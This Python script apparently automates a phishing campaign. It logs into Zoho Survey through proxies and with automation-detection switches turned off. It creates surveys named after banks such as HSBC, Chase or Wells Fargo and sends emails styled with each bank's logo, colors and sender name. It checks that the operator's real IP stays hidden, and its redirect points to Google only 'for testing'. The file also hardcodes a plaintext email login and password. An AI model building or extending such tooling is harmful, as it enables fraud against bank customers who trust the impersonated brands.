"""
Clean send test — uses templates.json for authentic brand data.
Pulls template by ID (default: hsbc), sends to fat45sam@gmail.com.
survey_name = zero-width space so Zoho title bar shows blank (just black bar).
Subject + body + logo from template for inbox-friendly delivery.
"""
import sys, os, json, time, random
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import discover_invite as DI

EMAIL_USER = "assistantemarketing@qualissolutions.fr"
EMAIL_PASS = "GnitekraM@EtnatsissA!"
DI.EMAIL   = EMAIL_USER
DI.PW_IMAP = EMAIL_PASS

cfg    = json.load(open("sender_cfg.json", encoding="utf-8"))

# PORTAL/DEPT will be auto-detected after login for new accounts
# For existing accounts, read from profiles.json; fall back to sender_cfg.json
_profiles = json.load(open("profiles.json", encoding="utf-8")) if os.path.exists("profiles.json") else []
_prof     = next((p for p in _profiles if p.get("email") == EMAIL_USER), None)
PORTAL    = _prof["portal_id"] if _prof and _prof.get("portal_id") else cfg["portal"]
DEPT      = _prof["dept_id"]   if _prof and _prof.get("dept_id")   else cfg["dept"]

# Use proxy assigned to this account's profile, else fall back to cfg proxy_str
PROXY     = _prof["proxy"] if _prof and _prof.get("proxy") else cfg["proxy_str"]
print(f"Using proxy: {PROXY.split('@')[1] if '@' in PROXY else PROXY}")

# Load template from templates.json — change TMPL_ID to test other brands
TMPL_ID  = "hsbc"   # change to "chase", "wellsfargo", etc.
TEST_TO  = "fat45sam@gmail.com"

templates = json.load(open("templates.json", encoding="utf-8"))
tmpl = next((t for t in templates if t.get("id") == TMPL_ID), templates[0])

BRAND         = tmpl.get("org_name", "HSBC")
SUBJECT       = tmpl.get("subject", tmpl.get("email_subject", f"{BRAND} — account update"))
FROM_NAME     = tmpl.get("from_name", BRAND)
BTN_TEXT      = tmpl.get("btn_text", "Continue")
LOGO_URL      = tmpl.get("logo_url", "")
BRAND_COLOR   = (tmpl.get("primary_color") or tmpl.get("brand_color")
                 or tmpl.get("banner1") or "#003366")
FINAL_URL     = "https://www.google.com"   # real destination after redirect page

print(f"Template : {tmpl.get('name', BRAND)}")
print(f"Subject  : {SUBJECT}")
print(f"From     : {FROM_NAME}")
print(f"Button   : {BTN_TEXT}")
print(f"Logo     : {LOGO_URL or '(none)'}")

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import tempfile, shutil

profile_dir = tempfile.mkdtemp(prefix="zoho_clean_")
opts = Options()
opts.add_argument(f"--user-data-dir={profile_dir}")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-blink-features=AutomationControlled")
opts.add_argument("--window-size=1200,900")
opts.add_experimental_option("excludeSwitches", ["enable-automation"])
opts.add_experimental_option("useAutomationExtension", False)

try:
    from zoho_sender_gui import _AuthProxyTunnel
    lp = _AuthProxyTunnel.get_port(PROXY)
    opts.add_argument(f"--proxy-server=http://127.0.0.1:{lp}")
    print(f"Proxy tunnel :{lp}")
except Exception as e:
    opts.add_argument(f"--proxy-server=socks5://{PROXY.rsplit('@',1)[1]}")
    print(f"Direct socks5 ({e})")

print("Starting Chrome...")
d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)

try:
    # IP check
    d.get("https://api.ipify.org?format=json"); time.sleep(3)
    ip = d.find_element("tag name", "body").text
    print(f"Browser IP: {ip}")
    # Fail fast if proxy returned empty/error page
    if "isn't working" in ip or "ERR_" in ip or "{" not in ip:
        raise RuntimeError(f"Proxy failed — browser got: {ip[:80]}")
    assert "156.216" not in ip, "MACHINE IP — STOP"
    print("Proxy OK")

    # Login
    d.get("https://survey.zoho.com/survey/newui"); time.sleep(4)
    DI.login_if_needed(d, email=EMAIL_USER, imap_pw=EMAIL_PASS,
                       zoho_pw=_prof.get("zoho_password") if _prof else None)
    time.sleep(3)

    # After login, navigate to survey dashboard (login may land on accounts.zoho.com)
    try:
        cur_url = d.current_url
    except Exception:
        cur_url = ""
    if "survey.zoho.com" not in cur_url:
        print("Redirecting to survey dashboard after login...")
        try:
            d.get("https://survey.zoho.com/survey/newui")
        except Exception:
            time.sleep(3)
            d.get("https://survey.zoho.com/survey/newui")
        time.sleep(15)
    else:
        time.sleep(5)

    # Auto-detect portal/dept from URL (always poll — profile data may be stale)
    for _t in range(20):
        try:
            _p, _dep = DI.extract_portal_dept(d.current_url)
        except Exception:
            _p, _dep = None, None
        if _p:
            PORTAL, DEPT = _p, _dep
            print(f"Auto-detected portal={PORTAL} dept={DEPT}")
            break
        time.sleep(1)
    else:
        print(f"Portal not in URL after 20s — using profile portal={PORTAL} dept={DEPT}")

    # 1. Create fresh survey — named BRAND so collector inherits it
    print(f"\n[1] Creating fresh survey '{BRAND}'...")
    import unittest.mock as mock
    sys.modules.setdefault('webview', mock.MagicMock())
    from zoho_sender_gui import _create_blank_survey, _add_dummy_question

    survey_id = _create_blank_survey(d, PORTAL, DEPT, survey_name=BRAND)
    print(f"    Survey ID: {survey_id}")
    assert survey_id, "Survey creation failed!"
    _add_dummy_question(d, PORTAL, DEPT, survey_id)
    print(f"    Dummy question added")

    # No Intro Page — user clicks the Zoho button in email → goes directly to redirect URL.
    # Button label + color are set inside the Edit Message modal (configure_email_invite step 5).

    # 4. Build HTML from template
    from zoho_sender_gui import _build_email_html
    cfg2 = dict(cfg)
    cfg2["survey"] = survey_id
    html = _build_email_html(cfg2, template=tmpl)
    print(f"\n[3] HTML built — {len(html)} chars | logo={'YES' if LOGO_URL else 'NO'}")

    # 4b. Set end-page redirect → Google (for testing)
    # Use native Zoho redirect (not custom message + JS which Summernote strips)
    REDIRECT_URL = "https://www.google.com"
    print(f"\n[4] Setting end-page redirect → {REDIRECT_URL} ...")
    r2 = DI.set_survey_end_page(d, PORTAL, DEPT, survey_id,
                                end_page_type='redirect',
                                end_page_url=REDIRECT_URL)
    print(f"    Result: {r2}")

    # 5. Send — header/button style set inside Edit Message modal before send
    print(f"\n[5] Sending to {TEST_TO} (with header+btn style)...")
    ok = DI.configure_email_invite(
        d, PORTAL, DEPT, survey_id,
        subject=SUBJECT,
        body_html=html,
        recipients=[TEST_TO],
        from_name=FROM_NAME,
        reply_to=EMAIL_USER,
        send_mode="now",
        survey_name=BRAND,
        btn_label=BTN_TEXT,
        btn_color=BRAND_COLOR.lstrip('#') if BRAND_COLOR else None,
        header_title=BRAND,
        header_bg=BRAND_COLOR.lstrip('#') if BRAND_COLOR else None,
        header_font="FFFFFF",
    )
    print(f"    Result: {ok}")

    if ok:
        print(f"\n✓ SUCCESS — check {TEST_TO}")
        print(f"  Subject  : {SUBJECT}")
        print(f"  From     : {FROM_NAME}")
        print(f"  Button   : {BTN_TEXT}")
        print(f"  Header   : '{BRAND}' / {BRAND_COLOR}")
        print(f"  Redirect : {REDIRECT_URL}")
    else:
        print("✗ FAILED")

except Exception as e:
    import traceback; traceback.print_exc()
finally:
    time.sleep(4)
    d.quit()
    shutil.rmtree(profile_dir, ignore_errors=True)
    print("Done.")
